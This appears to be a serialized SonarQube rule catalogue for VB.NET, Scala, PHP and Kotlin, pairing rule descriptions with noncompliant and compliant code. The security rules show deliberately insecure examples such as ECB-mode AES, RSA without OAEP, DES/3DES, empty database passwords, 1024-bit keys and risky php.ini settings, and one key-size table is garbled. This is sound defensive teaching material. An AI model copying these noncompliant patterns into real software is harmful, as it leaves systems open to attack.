 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>Z
CODE_SMELL
â
vbnet:S5542˘
vbnetS5542HEncryption algorithms should be used with secure mode and padding scheme"BLOCKER*vbnet:ˇ<p>To perform secure cryptography, operation modes and padding scheme are essentials and should be used correctly according to the encryption
algorithm:</p>
<ul>
  <li> For block cipher encryption algorithms (like AES, blowfish ...), the GCM (Galois Counter Mode) mode, witch <a
  href="https://en.wikipedia.org/wiki/Galois/Counter_Mode#Mathematical_basis">works internally</a> with zero/no padding scheme, is recommended. At the
  opposite, these modes and/or schemes are highly discouraged:
    <ul>
      <li> Electronic Codebook (ECB) mode is vulnerable because it doesn't provide serious message confidentiality: under a given key any given
      plaintext block always gets encrypted to the same ciphertext block. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul> </li>
  <li> RSA encryption algorithm should be used with the recommended padding scheme (OAEP) </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesmanaged?view=netframework-4.8">AesManaged</a> object with
insecure mode:</p>
<pre>
Dim aes4 = New AesManaged With {
    .KeySize = 128,
    .BlockSize = 128,
    .Mode = CipherMode.ECB, ' Noncompliant
    .Padding = PaddingMode.PKCS7
}
</pre>
<p><a
href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.rsacryptoserviceprovider?view=netframework-4.8">RSACryptoServiceProvider</a>
object without OAEP padding:</p>
<pre>
Dim RSA1 = New RSACryptoServiceProvider()
Dim encryptedData = RSA1.Encrypt(dataToEncrypt, False) ' Noncompliant: OAEP Padding is not used (second parameter set to false)
</pre>
<h2>Compliant Solution</h2>
<p>AES with GCM mode with <a href="https://www.bouncycastle.org/">bouncycastle</a> library: </p>
<pre>
Dim blockCipher As GcmBlockCipher = New GcmBlockCipher(New AesFastEngine()) ' Compliant
blockCipher.Init(True, New AeadParameters(New KeyParameter(secretKey), 128, iv, Nothing))
</pre>
<p>AES with GCM mode with <a href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesgcm?view=netcore-3.0">AesGcm</a>
object: </p>
<pre>
Dim aesGcm = New AesGcm(key) ' Compliant
</pre>
<p>RSA with OAEP padding with <a
href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.rsacryptoserviceprovider?view=netframework-4.8">RSACryptoServiceProvider</a>
object: </p>
<pre>
Dim RSA2 = New RSACryptoServiceProvider()
Dim encryptedData = RSA2.Encrypt(dataToEncrypt, True) ' Compliant: OAEP Padding is used (second parameter set to true)
</pre>
<p> </p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VwAZAg">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>ZVULNERABILITY
ê
vbnet:S2368Ä
vbnetS2368@Public methods should not have multidimensional array parameters"BLOCKER*vbnet:ë<p>Exposing methods with multidimensional array parameters requires developers to have advanced knowledge about the language in order to be able to
use them. Moreover, what exactly to pass to such parameters is not intuitive. Therefore, such methods should not be exposed, but can be used
internally.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub WriteMatrix(ByVal matrix As Integer()()) ' Non-Compliant
        ' ...
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Class Matrix
    ' ...
End Class

Module Module1
    Sub WriteMatrix(ByVal matrix As Matrix)      ' Compliant
        ' ...
    End Sub
End Module
</pre>Z
CODE_SMELL
”
vbnet:S3889√
vbnetS3889;Neither "Thread.Resume" nor "Thread.Suspend" should be used"BLOCKER*vbnet:‡<p><code>Thread.Suspend</code> and <code>Thread.Resume</code> can give unpredictable results, and both methods have been deprecated. Indeed, if
<code>Thread.Suspend</code> is not used very carefully, a thread can be suspended while holding a lock, thus leading to a deadlock. Other safer
synchronization mechanisms should be used, such as <code>Monitor</code>, <code>Mutex</code>, and <code>Semaphore</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Sub Foo()
    Thread.CurrentThread.Suspend() ' Noncompliant
    Thread.[Resume]() ' Noncompliant
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://msdn.microsoft.com/en-us/library/system.threading.thread.resume.aspx">Thread.Resume Method ()</a> </li>
  <li> <a href="https://msdn.microsoft.com/en-us/library/system.threading.thread.suspend(v=vs.110).aspx">Thread.Suspend Method ()</a> </li>
</ul>ZBUG
˙
vbnet:S3693Í
vbnetS36932Exception constructors should not throw exceptions"BLOCKER*vbnet:ê<p>It may be a good idea to raise an exception in a constructor if you're unable to fully flesh the object in question, but not in an
<code>exception</code> constructor. If you do, you'll interfere with the exception that was originally being thrown. Further, it is highly unlikely
that an exception raised in the creation of an exception will be properly handled in the calling code, and the unexpected, unhandled exception will
lead to program termination.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class MyException
    Inherits Exception

    Public Sub MyException()
        If bad_thing Then
            Throw New Exception("A bad thing happened")
        End If
    End Sub
End Class
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>ZBUG
≈
vbnet:S1048µ
vbnetS1048&Finalizers should not throw exceptions"BLOCKER*vbnet:Á<p>If Finalize or an override of Finalize throws an exception, and the runtime is not hosted by an application that overrides the default policy, the
runtime terminates the process immediately without graceful cleanup (finally blocks and finalizers are not executed). This behavior ensures process
integrity if the finalizer cannot free or destroy resources.</p>
<p>The rule reports on throw statements used in finalizers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class MyClass
    Protected Overrides Sub Finalize()
        Throw New NotImplementedException() ' Noncompliant
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class MyClass
    Protected Overrides Sub Finalize()
        ' No throw
    End Sub
End Class
</pre>ZBUG
ø
vbnet:S4159Ø
vbnetS4159;Classes should implement their "ExportAttribute" interfaces"BLOCKER*vbnet:Ã<p>In the Attributed Programming Model, the <code>ExportAttribute</code> declares that a part "exports", or provides to the composition container, an
object that fulfills a particular contract. During composition, parts with imports that have matching contracts will have those dependencies filled by
the exported object.</p>
<p>If the type doesn't implement the interface it is exporting there will be an issue at runtime (either a cast exception or just a container not
filled with the exported type) leading to unexpected behaviors/crashes.</p>
<p>The rule raises an issue when a class doesn't implement or inherit the type declared in the <code>ExportAttribute</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;Export(GetType(ISomeType))&gt;
Public Class SomeType  // Noncompliant; doesn't implement 'ISomeType'.
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Export(GetType(ISomeType))&gt;
Public Class SomeType
    Inherits ISomeType
End Class
</pre>ZBUG
π
vbnet:S3464©
vbnetS3464(Type inheritance should not be recursive"BLOCKER*vbnet:Ÿ<p>Recursion is acceptable in methods, where you can break out of it. But with class types, you end up with code that will compile but not run if you
try to instantiate the class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class C1(Of T)
End Class
Class C2(Of T)
    Inherits C1(Of C2 (Of T))
End Class
' ...
Dim c2 = New C2(Of Integer)
</pre>ZBUG
ƒ
vbnet:S3869¥
vbnetS38694"SafeHandle.DangerousGetHandle" should not be called"BLOCKER*vbnet:ÿ<p>Not surprisingly, the <code>SafeHandle.DangerousGetHandle</code> method is dangerous. That's because it may not return a valid handle. Using it can
lead to leaks and vulnerabilities. While it is possible to use the method successfully, it's extremely difficult to do correctly, so the method should
simply be avoided altogether.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Sub Dangerous(fieldInfo As System.Reflection.FieldInfo)
  Dim handle As SafeHandle = CType(fieldInfo.GetValue(fieldInfo), SafeHandle)
  Dim dangerousHandle As IntPtr = handle.DangerousGetHandle ' Noncompliant
End Sub
</pre>ZBUG
ñ
scala:S2068Ü
scalaS2068$Credentials should not be hard-coded"BLOCKER*scala:∞<p>Because it is easy to extract strings from a compiled application, credentials should never be hard-coded. Do so, and they're almost guaranteed to
end up in the hands of an attacker. This is particularly true for applications that are distributed.</p>
<p>Credentials should be stored outside of the code in a strongly-protected encrypted configuration file or database.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It's recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", ...</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/798">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/259">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/qQCHAQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
  <li> OWASP Top 10 2017 Category A2 - Broken Authentication </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>ZVULNERABILITY
ˆ	
scala:S1451Ê	
scalaS1451+Track lack of copyright and license headers"BLOCKER*scala:å	<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>Z
CODE_SMELL
û
	php:S2115ê
phpS2115&Databases should be password-protected"BLOCKER*php:º
<p>Databases should always be password protected. The use of a database connection with an empty password is a clear indication of a database that is
not protected.</p>
<p>This rule flags database connections with empty passwords.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;?php
  $servername = "localhost";
  $username = "AppLogin";
  $password = "";

  // MySQL
  $conn = new mysqli($servername, $username, $password);
  // MySQL
  $conn = mysqli_connect($servername, $username, $password);
  // PDO way
  $conn = new PDO("mysql:host=$servername;dbname=myDB", $username, $password);
  // Oracle
  $conn = oci_connect($username, $password, "//localhost/orcl");
  // MS SQL Server
  $sqlsrvName = "serverName\sqlexpress";
  $sqlsrvConnInfo = array( "Database"=&gt;"myDB", "UID"=&gt;$username, "PWD"=&gt;$password);
  $conn = sqlsrv_connect( $sqlsrvName, $sqlsrvConnInfo);
  // PosgreSQL
  $pgConnInfo = "host=localhost port=5432 dbname=test user=" . $username . " password=" . $password;
  $conn = pg_connect($pgConnInfo);
?&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/521.html">MITRE, CWE-521</a> - Weak Password Requirements </li>
</ul>ZVULNERABILITY
©
	php:S1599õ
phpS1599%Variable variables should not be used"BLOCKER*php:À<p>PHP's "variable variables" feature (dynamically-named variables) is temptingly powerful, but can lead to unmaintainable code. </p>
<h2>Noncompliant Code Example</h2>
<pre>
$var = 'foo';
$$var = 'bar';      //Noncompliant
$$$var = 'hello';  //Noncompliant

echo $foo; //will display 'bar'
echo $bar; //will display 'hello'
</pre>Z
CODE_SMELL
	
	php:S1451‚	
phpS1451+Track lack of copyright and license headers"BLOCKER*php:å	<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>Z
CODE_SMELL
ã
	php:S2278˝
phpS2278GNeither DES (Data Encryption Standard) nor DESede (3DES) should be used"BLOCKER*php:à<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>
<blockquote>
  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer
  provides the security that is needed to protect federal government information.</p>
  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>
</blockquote>
<p>For similar reasons, RC2 should also be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;?php
  $ciphertext = mcrypt_encrypt(MCRYPT_DES, $key, $plaintext, $mode); // Noncompliant
  // ...
  $ciphertext = mcrypt_encrypt(MCRYPT_DES_COMPAT, $key, $plaintext, $mode); // Noncompliant
  // ...
  $ciphertext = mcrypt_encrypt(MCRYPT_TRIPLEDES, $key, $plaintext, $mode); // Noncompliant
  // ...
  $ciphertext = mcrypt_encrypt(MCRYPT_3DES, $key, $plaintext, $mode); // Noncompliant

  $cipher = "des-ede3-cfb";  // Noncompliant
  $ciphertext_raw = openssl_encrypt($plaintext, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
?&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;?php
  $ciphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $plaintext, MCRYPT_MODE_CBC, $iv);
?&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VwAZAg">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE">DES / DESede Unsafe</a> </li>
</ul>ZVULNERABILITY
‚
	php:S3336‘
phpS3336-"session.use_trans_sid" should not be enabled"BLOCKER*php:˘<p>PHP's <code>session.use_trans_sid</code> automatically appends the user's session id to urls when cookies are disabled. On the face of it, this
seems like a nice way to let uncookie-able users use your site anyway. In reality, it makes those users vulnerable to having their sessions hijacked
by anyone who might:</p>
<ul>
  <li> see the URL over the user's shoulder </li>
  <li> be sent the URL by the user </li>
  <li> retrieve the URL from browser history </li>
  <li> ... </li>
</ul>
<p>For that reason, it's better to practice a little "tough love" with your users and force them to turn on cookies.</p>
<p>Since <code>session.use_trans_sid</code> is off by default, this rule raises an issue when it is explicitly enabled.</p>
<h2>Noncompliant Code Example</h2>
<pre>
; php.ini
session.use_trans_sid=1  ; Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
</ul>ZVULNERABILITY
·
	php:S3337”
phpS3337"enable_dl" should be disabled"BLOCKER*php:á<p><code>enable_dl</code> is on by default and allows <code>open_basedir</code> restrictions, which limit the files a script can access, to be
ignored. For that reason, it's a dangerous option and should be explicitly turned off.</p>
<p>This rule raises an issue when <code>enable_dl</code> is not explicitly set to 0 in <em>php.ini</em>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
; php.ini
enable_dl=1  ; Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
; php.ini
enable_dl=0
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/23.html">MITRE, CWE-23</a> - Relative Path Traversal </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/36.html">MITRE, CWE-36</a> - Absolute Path Traversal </li>
</ul>ZVULNERABILITY
≈

	php:S3334∑

phpS3334<"allow_url_fopen" and "allow_url_include" should be disabled"BLOCKER*php:Õ	<p><code>allow_url_fopen</code> and <code>allow_url_include</code> allow code to be read into a script from URL's. The ability to suck in executable
code from outside your site, coupled with imperfect input cleansing could lay your site bare to attackers. Even if your input filtering is perfect
today, are you prepared to bet your site that it will always be perfect in the future?</p>
<p>This rule raises an issue when either property is explicitly enabled in <em>php.ini</em> and when <code>allow_url_fopen</code>, which defaults to
enabled, is not explicitly disabled.</p>
<h2>Noncompliant Code Example</h2>
<pre>
; php.ini  Noncompliant; allow_url_fopen not explicitly disabled
allow_url_include=1  ; Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
; php.ini
allow_url_fopen=0
allow_url_include=0
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/829.html">MITRE, CWE-829</a> - Inclusion of Functionality from Untrusted Control Sphere </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat2">SANS Top 25</a> - Risky Resource Management </li>
</ul>ZVULNERABILITY
á
	php:S4426˘
phpS4426#Cryptographic keys should be robust"BLOCKER*php:®<p>Most of cryptographic systems require a sufficient key size to be robust against brute-force attacks.</p>
<p><a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST recommendations</a> will be checked:</p>
<table>
  <tbody>
    <tr>
      <th>Use / Algorithm</th>
      <th>DSA</th>
      <th>RSA</th>
      <th>ECDSA</th>
      <th>DH</th>
      <th>MQV</th>
      <th>ECDH</th>
      <th>ECMQV</th>
      <th>Block Cipher</th>
    </tr>
    <tr>
      <td>Digital Signature Generation </td>
      <td> p ‚â• 2048 AND q ‚â• 224</td>
      <td>n ‚â• 2048</td>
      <td>See table below </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x <br></td>
      <td>Digital Signature Verification </td>
      <td> p ‚â• 2048 AND q ‚â• 224</td>
      <td>n ‚â• 2048</td>
      <td>See table below </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x <br></td>
      <td>Key Agreement </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> p ‚â• 2048 AND q ‚â• 224 </td>
      <td> p ‚â• 2048 AND q ‚â• 224 </td>
      <td> See table below </td>
      <td> See table below </td>
      <td> x <br></td>
      <td> Encryption and Decryption </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> AES-128, 192, 256 <br><br>This rule will not raise issues for ciphers that are considered weak (no matter the key size) like
      <code>DES</code>, <code>Blowfish</code>.<br><br>h3. Notation<br>* DSA ([Digital Signature Algorithm</td>
      <td>https://en.wikipedia.org/wiki/Digital_Signature_Algorithm]): <code>p</code> is key length and <code>q</code> the modulus length<br>* EC
      ([Elliptic-curve</td>
      <td>https://en.wikipedia.org/wiki/Elliptic-curve_cryptography])<br></td>
      <td></td>
      <td>EC parameters</td>
      <td></td>
      <td>EB</td>
      <td></td>
      <td>EC</td>
      <td></td>
      <td>ED</td>
      <td></td>
      <td>EE</td>
      <td></td>
    </tr>
    <tr>
      <td> Length of n </td>
      <td> 224-255 </td>
      <td> 256-383 </td>
      <td> 384-511 </td>
      <td> 512+<br></td>
      <td> Maximum bit length of cofactor h </td>
      <td> 14 </td>
      <td> 16 </td>
      <td> 24 </td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
$config = array(
    "digest_alg" =&gt; "sha512",
    "private_key_bits" =&gt; 1024, // Noncompliant
    "private_key_type" =&gt; OPENSSL_KEYTYPE_RSA,
);
$res = openssl_pkey_new($config);
</pre>
<h2>Compliant Solution</h2>
<pre>
$config = array(
    "digest_alg" =&gt; "sha512",
    "private_key_bits" =&gt; 2048 // Compliant
    "private_key_type" =&gt; OPENSSL_KEYTYPE_RSA,
);
$res = openssl_pkey_new($config);
</pre>
<h2>See</h2>
<p> * <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure</p>
<p> * <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A9</a> - Security
Misconfiguration</p>
<p> * <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST 800-131A</a> - Recommendation for Transitioning the
Use of Cryptographic Algorithms and Key Lengths</p>
<p> * <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-326</a> - Inadequate Encryption Strength</p>ZVULNERABILITY
ﬁ
	php:S3333–
phpS3333'"open_basedir" should limit file access"BLOCKER*php:˚<p>The <code>open_basedir</code> configuration in <em>php.ini</em> limits the files the script can access using, for example, <code>include</code> and
<code>fopen()</code>. Leave it out, and there is no default limit, meaning that any file can be accessed. Include it, and PHP will refuse to access
files outside the allowed path.</p>
<p><code>open_basedir</code> should be configured with a directory, which will then be accessible recursively. However, the use of <code>.</code>
(current directory) as an <code>open_basedir</code> value should be avoided since it's resolved dynamically during script execution, so a
<code>chdir('/')</code> command could lay the whole server open to the script.</p>
<p>This is not a fool-proof configuration; it can be reset or overridden at the script level. But its use should be seen as a minimum due diligence
step. This rule raises an issue when <code>open_basedir</code> is not present in <em>php.ini</em>, and when <code>open_basedir</code> contains root,
or the current directory (<code>.</code>) symbol.</p>
<h2>Noncompliant Code Example</h2>
<pre>
; php.ini try 1
; open_basedir="${USER}/scripts/data"  Noncompliant; commented out

; php.ini try 2
open_basedir="/:${USER}/scripts/data"  ; Noncompliant; root directory in the list
</pre>
<h2>Compliant Solution</h2>
<pre>
; php.ini try 1
open_basedir="${USER}/scripts/data"
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/23.html">MITRE, CWE-23</a> - Relative Path Traversal </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/36.html">MITRE, CWE-36</a> - Absolute Path Traversal </li>
</ul>ZVULNERABILITY
µ

	php:S2007ß

phpS2007@Functions and variables should not be defined outside of classes"BLOCKER*php:º	<p>Defining and using global variables and global functions, when the convention dictates OOP can be confusing and difficult to use properly for
multiple reasons:</p>
<ul>
  <li> You run the risk of name clashes. </li>
  <li> Global functions must be stateless, or they can cause difficult-to-track bugs. </li>
  <li> Global variables can be updated from anywhere and may no longer hold the value you expect. </li>
  <li> It is difficult to properly test classes that use global functions. </li>
</ul>
<p>Instead of being declared globally, such variables and functions should be moved into a class, potentially marked <code>static</code>, so they can
be used without a class instance. </p>
<p>This rule checks that only object-oriented programming is used and that no functions or procedures are declared outside of a class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;?php

$name = "Bob"; // Noncompliant

function doSomething($arg) {   // Noncompliant
  //...
}

class MyClass {
    //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;?php
class MyClass {

  public static $name = "Bob"; // Compliant

  public static function doSomething($arg) {              // Compliant
    //...
  }
  //...
}
</pre>Z
CODE_SMELL
Ø
	php:S3338°
phpS3338!"file_uploads" should be disabled"BLOCKER*php:“<p><code>file_uploads</code> is an on-by-default PHP configuration that allows files to be uploaded to your site. Since accepting <del>candy</del>
files from strangers is inherently dangerous, this feature should be disabled unless it is absolutely necessary for your site.</p>
<p>This rule raises an issue when <code>file_uploads</code> is not explicitly disabled.</p>
<h2>Noncompliant Code Example</h2>
<pre>
; php.ini
file_uploads=1  ; Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
; php.ini
file_uploads=0
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/434.html">MITRE, CWE-434</a> - Unrestricted Upload of File with Dangerous Type </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat1">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>ZVULNERABILITY
∏	
	php:S1799™	
phpS17998"exit(...)" and "die(...)" statements should not be used"BLOCKER*php:Œ<p>The <code>exit(...)</code> and <code>die(...)</code> statements should absolutely not be used in Web PHP pages as this might lead to a very bad
user experience. In such case, the end user might have the feeling that the web site is down or has encountered a fatal error. </p>
<p>But of course PHP can also be used to develop command line application and in such case use of <code>exit(...)</code> or <code>die(...)</code>
statement can be justified but must remain limited and not spread all over the application. We expect exceptions to be used to handle errors and those
exceptions should be caught just before leaving the application to specify the exit code with help of <code>exit(...)</code> or <code>die(...)</code>
statements.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo {
    public function bar($param)  {
        if ($param === 42) {
            exit(23);
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Foo {
    public function bar($param)  {
        if ($param === 42) {
            throw new Exception('Value 42 is not expected.');
        }
    }
}
</pre>ZBUG
⁄
php:S128Õ
phpS128?Switch cases should end with an unconditional "break" statement"BLOCKER*php:‰<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While
this is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch ($myVariable) {
  case 1:
    foo();
    break;
  case 2:  // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?
    do_something();
  default:
    do_something_else();
   break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch ($myVariable) {
  case 1:
    foo();
    break;
  case 2:
    do_something();
    break;
  default:
    do_something_else();
   break;
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed in following cases:</p>
<pre>
switch ($myVariable) {
  case 0:                  // Empty case used to specify the same behavior for a group of cases.
  case 1:
    do_something();
    break;
  case 2:                  // Use of continue statement
    continue;
  case 3:                  // Case includes a jump statement (exit, return, break &amp;etc)
    exit(0);
  case 4:
    echo 'Second case, which falls through';
    // no break        &lt;- comment is used when fall-through is intentional in a non-empty case body
  default:                 // For the last case, use of break statement is optional
    doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/484.html">MITRE, CWE-484</a> - Omitted Break Statement in Switch </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YIFLAQ">CERT, MSC17-C.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ewHAAQ">CERT, MSC52-J.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
</ul>Z
CODE_SMELL
Â
	php:S2014◊
phpS2014."$this" should not be used in a static context"BLOCKER*php:Ö<p><code>$this</code> refers to the current class instance. But static methods can be accessed without instantiating the class, and <code>$this</code>
is not available to them. Using <code>$this</code> in a static context will result in a fatal error at runtime.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Clazz {
  $name=NULL;  // instance variable

  public static function foo(){
    if ($this-&gt;name != NULL) {
      // ...
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Clazz {
  $name=NULL;  // instance variable

  public static function foo($nameParam){
    if ($nameParam != NULL) {
      // ...
    }
  }
}
</pre>ZBUG
˘	
kotlin:S1451Ë	
kotlinS1451+Track lack of copyright and license headers"BLOCKER*kotlin:å	<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
